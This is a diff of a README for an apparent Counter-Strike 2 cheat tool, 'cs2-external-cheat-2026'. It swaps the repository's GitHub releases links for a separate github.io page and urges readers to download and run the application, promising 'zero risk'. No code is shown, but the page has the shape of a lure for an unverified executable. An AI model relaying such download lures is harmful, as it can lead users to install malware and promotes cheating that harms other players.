@@ -1,6 +1,6 @@
 # 🎯 cs2-external-cheat-2026 - Dominate CS2 with Zero Risk
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_External_Cheat_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Albertobarytic1691/cs2-external-cheat-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_External_Cheat_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://albertobarytic1691.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome! This guide will help you download and run the **CS2 External Cheat 2026
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[https://github.com/Albertobarytic1691/cs2-external-cheat-2026/releases](https://github.com/Albertobarytic1691/cs2-external-cheat-2026/releases)**
+Visit this link to download the application: **[https://albertobarytic1691.github.io](https://albertobarytic1691.github.io)**
 
 Once you're on that page, you'll see a list of files. Look for the newest version and click the download button. The file will be saved to your "Downloads" folder.
 
@@ -161,7 +161,7 @@ Now you're ready to dominate the battlefield.
 
 Need the link one more time? Here it is:
 
-**[Download CS2 External Cheat 2026](https://github.com/Albertobarytic1691/cs2-external-cheat-2026/releases)**
+**[Download CS2 External Cheat 2026](https://albertobarytic1691.github.io)**
 
 Visit this link to download the application. It's that simple.
 
